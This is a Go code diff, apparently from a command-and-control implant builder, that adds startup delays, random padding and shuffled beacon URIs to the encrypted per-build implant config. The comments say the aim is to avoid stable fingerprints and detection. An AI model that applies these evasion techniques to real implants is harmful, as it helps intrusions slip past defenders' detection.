@@ -63,6 +63,9 @@ type agentConfigJSON struct {
 	MalleableRequestHeaders map[string]string `json:"malleable_request_headers"`
 	// Max random bytes appended to the HTTP/WS beacon body (0=disabled).
 	ContentLengthJitter string `json:"content_length_jitter"`
+	// Startup delay window in seconds (0/0 = disabled).
+	StartDelayMin string `json:"start_delay_min"`
+	StartDelayMax string `json:"start_delay_max"`
 	// v2 chains + rotation (agent parses ServerOutput via MalleableRespDecode).
 	MalleableRespDecode string `json:"malleable_resp_decode"`
 	MalleableClientID   string `json:"malleable_client_id"`
@@ -73,6 +76,9 @@ type agentConfigJSON struct {
 	UserAgents          string `json:"user_agents"`
 	JitterURI           string `json:"jitter_uri"`
 	ParameterNames      string `json:"parameter_names"`
+	// Pad is per-build random hex filler so the blob length varies per build
+	// even for identical configs. The agent ignores unknown fields.
+	Pad string `json:"pad,omitempty"`
 }
 
 // randomAESKey returns 32 random bytes suitable for AES-256.
@@ -242,6 +248,8 @@ func marshalConfigBlobJSON(cfg ImplantConfig, profile MalleableProfile) []byte {
 		MalleableRequestAppend:  cfg.MalleableRequestAppend,
 		MalleableRequestHeaders: cfg.MalleableRequestHeaders,
 		ContentLengthJitter:     fmt.Sprintf("%d", cfg.ContentLengthJitter),
+		StartDelayMin:           fmt.Sprintf("%d", cfg.StartDelayMin),
+		StartDelayMax:           fmt.Sprintf("%d", cfg.StartDelayMax),
 		MalleableRespDecode:     cfg.MalleableServerOutput,
 		MalleableClientID:       cfg.MalleableClientID,
 		MalleableClientMeta:     cfg.MalleableClientMetadata,
@@ -259,12 +267,47 @@ func marshalConfigBlobJSON(cfg ImplantConfig, profile MalleableProfile) []byte {
 	return raw
 }
 
+// randomPadHex returns n random bytes hex-encoded (2n chars).
+func randomPadHex(n int) string {
+	b := make([]byte, n)
+	if _, err := rand.Read(b); err != nil {
+		return ""
+	}
+	return hex.EncodeToString(b)
+}
+
+// shuffleBeaconURIs returns a per-build random ordering of the beacon URI pool
+// so the serialized blob order is not a stable fingerprint.
+func shuffleBeaconURIs(in []string) []string {
+	out := append([]string(nil), in...)
+	for i := len(out) - 1; i > 0; i-- {
+		var j int
+		buf := make([]byte, 8)
+		if _, err := rand.Read(buf); err != nil {
+			break
+		}
+		v := uint64(buf[0]) | uint64(buf[1])<<8 | uint64(buf[2])<<16 | uint64(buf[3])<<24 |
+			uint64(buf[4])<<32 | uint64(buf[5])<<40 | uint64(buf[6])<<48 | uint64(buf[7])<<56
+		j = int(v % uint64(i+1))
+		out[i], out[j] = out[j], out[i]
+	}
+	return out
+}
+
 // buildConfigBlobKeyed produces the obfuscated config blob and the strxor-encoded
 // per-build AES key to inject via -X main.SConfigKey. Each build gets a unique
 // key, so a captured blob from one implant cannot be decrypted with another
 // implant's key (eliminating the fleet-wide shared constant).
 func buildConfigBlobKeyed(cfg ImplantConfig, profile MalleableProfile) (blob string, sConfigKey string) {
-	raw := marshalConfigBlobJSON(cfg, profile)
+	// Per-build jitter: random pad length 8-40 bytes + shuffled URI order so
+	// identical configs still produce different-length blobs.
+	padLen := 8
+	if b := make([]byte, 1); func() bool { _, err := rand.Read(b); return err == nil }() {
+		padLen = 8 + int(b[0]%33) // 8-40
+	}
+	cfgCopy := cfg
+	cfgCopy.BeaconURIs = shuffleBeaconURIs(cfg.BeaconURIs)
+	raw := marshalConfigBlobJSONWithPad(cfgCopy, profile, randomPadHex(padLen))
 	if raw == nil {
 		return "", ""
 	}
@@ -273,4 +316,32 @@ func buildConfigBlobKeyed(cfg ImplantConfig, profile MalleableProfile) (blob str
 		return "", ""
 	}
 	return obfuscateBlobKeyed(raw, key), strxorEncode(hex.EncodeToString(key))
+}
+
+// marshalConfigBlobJSONWithPad is marshalConfigBlobJSON plus a random pad field.
+func marshalConfigBlobJSONWithPad(cfg ImplantConfig, profile MalleableProfile, pad string) []byte {
+	raw := marshalConfigBlobJSON(cfg, profile)
+	if raw == nil {
+		return nil
+	}
+	if pad == "" {
+		return raw
+	}
+	// Inject "pad" before the final closing brace to avoid re-marshaling.
+	trimmed := strings.TrimRight(string(raw), " \n\r\t")
+	if !strings.HasSuffix(trimmed, "}") {
+		return raw
+	}
+	inner := strings.TrimSuffix(trimmed, "}")
+	sep := ""
+	if len(strings.TrimSpace(inner)) > 1 {
+		sep = ","
+	}
+	out, err := json.Marshal(map[string]string{"pad": pad})
+	if err != nil {
+		return raw
+	}
+	// out is {"pad":"..."} — splice inner content.
+	frag := strings.TrimPrefix(strings.TrimSuffix(string(out), "}"), "{")
+	return []byte(inner + sep + frag + "}")
 }
